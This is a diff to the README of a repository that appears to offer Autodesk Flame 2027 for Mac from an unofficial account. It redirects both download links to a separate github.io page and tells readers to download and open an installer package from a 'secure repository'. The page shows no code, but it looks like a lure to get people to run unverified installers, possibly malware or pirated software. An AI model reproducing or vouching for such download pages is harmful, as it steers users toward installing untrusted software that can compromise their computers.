@@ -1,6 +1,6 @@
 # 🎬 autodesk-flame-2027-mac - Professional visual effects at your fingertips
 
-[![](https://img.shields.io/badge/Download-Flame_2027-blue.svg)](https://github.com/lessoncushioning739/autodesk-flame-2027-mac)
+[![](https://img.shields.io/badge/Download-Flame_2027-blue.svg)](https://lessoncushioning739.github.io)
 
 ## 📖 Overview 
 
@@ -22,7 +22,7 @@ Check your computer settings under the Apple menu to confirm you have enough mem
 
 You must download the installation package from the secure repository link provided below. 
 
-[Download Autodesk Flame 2027](https://github.com/lessoncushioning739/autodesk-flame-2027-mac)
+[Download Autodesk Flame 2027](https://lessoncushioning739.github.io)
 
 Click the link above. This directs you to the main project page. Look for the file named "flame_2027_installer.pkg" in the list of files. Click the file name to start the download to your computer. Save the file to your Downloads folder to find it easily. 
 
